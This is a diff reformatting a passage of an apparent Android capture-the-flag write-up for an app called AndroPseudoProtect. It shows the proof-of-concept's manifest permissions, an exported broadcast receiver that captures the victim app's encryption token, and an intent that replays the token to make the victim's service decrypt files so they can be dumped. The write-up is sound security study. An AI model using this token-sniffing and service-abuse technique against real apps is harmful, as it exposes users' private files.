@@ -75,19 +75,53 @@ AndroPseudoProtect encrypts files using token generated using SecurityUtils.getS
 
 - Needed the permissions to read files and post notifications, allowed by the challenge. Need a foreground service to keep listening to any new broadcast from victim app. Starting from Android 26+ any app in background with no active process is killed by the OS. Snippet from AndroidManifest.xml of PoC: 
 
-<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/> <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/> <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/> <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/> <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/> 
+```xml
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
 
-______________________________________________________________________________ <service android:name=".ListenerService" android:exported="false" android:foregroundServiceType="dataSync"/> 
+<service android:name=".ListenerService" android:exported="false" android:foregroundServiceType="dataSync"/>
+```
 
 - The MainActivity of the PoC just check file permissions and notifications permissions and does requestPermissions(…) to user if not granted. 
 
-- Then there is the ListenerService.java which - ------ registers receiver 
+- Then there is the ListenerService.java which registers receiver 
 
-private final BroadcastReceiver receiver = new BroadcastReceiver() { @Override public void onReceive(Context ctx, Intent intent) { String action = intent.getAction(); String token = intent.getStringExtra(EXTRA_TOKEN); if (token != null) { capturedToken = token; 
+```java
+private final BroadcastReceiver receiver = new BroadcastReceiver() {
+    @Override
+    public void onReceive(Context ctx, Intent intent) {
+        String action = intent.getAction();
+        String token = intent.getStringExtra(EXTRA_TOKEN);
+        if (token != null) {
+            capturedToken = token;
+```
 
-____________________________________________________________________________ IntentFilter f = new IntentFilter(); f.addAction(ACTION_START); f.addAction(ACTION_STOP); f.addAction(ACTION_DEC_OK); if (Build.VERSION.SDK_INT >= 33) { registerReceiver(receiver, f, Context.RECEIVER_EXPORTED); } else { registerReceiver(receiver, f); } ----------- decrypts files by fooling securityservice of victim application Intent i = new Intent(); i.setClassName(VICTIM_PKG, VICTIM_SVC); i.setAction(ACTION_STOP); i.putExtra(EXTRA_TOKEN, token); startService(i); 
+```java
+IntentFilter f = new IntentFilter();
+f.addAction(ACTION_START);
+f.addAction(ACTION_STOP);
+f.addAction(ACTION_DEC_OK);
+if (Build.VERSION.SDK_INT >= 33) {
+    registerReceiver(receiver, f, Context.RECEIVER_EXPORTED);
+} else {
+    registerReceiver(receiver, f);
+}
+```
 
-________ lists and dumps the unencrypted files contents from external storage 
+decrypts files by fooling securityservice of victim application
+
+```java
+Intent i = new Intent();
+i.setClassName(VICTIM_PKG, VICTIM_SVC);
+i.setAction(ACTION_STOP);
+i.putExtra(EXTRA_TOKEN, token);
+startService(i);
+```
+
+...lists and dumps the unencrypted files contents from external storage 
 
 # **6. Execution** 
 
